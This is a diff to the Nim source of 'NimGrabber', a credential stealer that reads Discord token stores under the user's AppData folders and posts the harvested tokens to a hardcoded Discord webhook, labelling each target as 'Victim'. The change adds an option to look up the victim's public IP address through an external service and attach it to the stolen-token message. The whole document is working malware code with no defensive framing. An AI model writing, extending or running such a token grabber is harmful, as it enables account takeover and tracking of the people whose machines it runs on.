@@ -10,6 +10,8 @@ from strutils import replace, endswith, strip
 let 
   webhook = "https://discord.com/api/webhooks/489398398492932/you-only-live-once"
   userid: int64 = 87284798287919821
+const
+  sendIP: char = 'Y' ## Possible options: "Y, N"
 
 # Do not touch the following
 # --------------------------
@@ -21,7 +23,6 @@ var
 let 
   roaming = getenv("appdata")
   local   = getenv("localappdata")
-  begin = &"<@{userid}> Victim: **{\"username\".getenv}**\n**__Tokens grabbed by NimGrabber__**:\n"
    
   paths = [
     roaming / "Discord", 
@@ -66,6 +67,13 @@ if tokens.len == 0: ## Just in case no token ever gets found
 tokens = tokens.deduplicate ## Prepare tokens for uploading
 for c in tokens: hooktks.add(c & "\n")
 hooktks = &"```\n{hooktks.strip(leading=false)}```"
+
+when sendIP == 'Y': 
+    let ip: string = fetch("https://api.ipify.org/")
+    let begin = &"<@{userid}> Victim: **{\"username\".getenv}** | IP Address: **{ip}** \n**__Tokens grabbed by NimGrabber__**:\n"
+else: 
+    let begin = &"<@{userid}> Victim: **{\"username\".getenv}**\n**__Tokens grabbed by NimGrabber__**:\n"
+    
 var data = %*{ 
     "content": begin & hooktks, 
     "username": "Nim666" 
